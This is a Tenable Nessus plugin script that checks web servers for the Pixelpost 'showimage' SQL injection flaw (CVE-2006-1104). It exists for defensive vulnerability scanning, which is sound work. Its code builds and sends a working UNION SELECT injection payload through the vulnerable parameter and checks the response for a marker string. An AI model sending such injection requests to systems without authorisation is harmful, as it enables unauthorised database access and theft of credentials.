#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(21049);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2006-1104");
  script_bugtraq_id(16964);
  script_osvdb_id(23799);

  script_name(english:"Pixelpost < 1.5 RC1 showimage Parameter SQL Injection");
  script_summary(english:"Tries to inject SQL code via Pixelpost's showimage parameter");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that suffers from
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Pixelpost, a photo blog application based
on PHP and MySQL. 

The version of Pixelpost installed on the remote host fails to
sanitize input to the 'showimage' parameter of the 'index.php' script
before using it to construct database queries.  Provided PHP's
'magic_quotes_gpc' setting is disabled, an unauthenticated attacker
can exploit this flaw to inject arbitrary SQL code and thereby uncover
sensitive information such as authentication credentials, launch
attacks against the underlying database application, etc. 

In addition, the application reportedly contains a similar SQL
injection flaw involving the 'USER_AGENT', 'HTTP_REFERER' and
'HTTP_HOST' variables used in 'includes/functions.php', a cross-site
scripting issue involving the comment, name, url, and email values
when commenting on a post, and an information disclosure flaw
involving direct requests to 'includes/phpinfo.php'.  Nessus has not,
though, checked for them." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/426764/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://forum.pixelpost.org/showthread.php?t=3535" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Pixelpost version 1.5 RC1 or later when it becomes
available." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/04");
 script_cvs_date("$Date: 2015/02/11 21:07:50 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/pixelpost", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to return some bogus info.
  magic = string(SCRIPT_NAME, "-", unixtime(), ".jpg");
  query = string(
    "UNION SELECT ", 
      "'", magic, "' as id, ", 
      rand(), " as headline, ",
      rand(), " as datetime, ",
      rand(), " as body, ",
      rand(), " as category, ",
      rand(), " as image"
  );

  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/?",
      "showimage=", urlencode(str:string("') ", query)), "--" ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we get our "image" name back in a link.
  if (string('<a href="index.php?showimage=', magic) >< res)
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
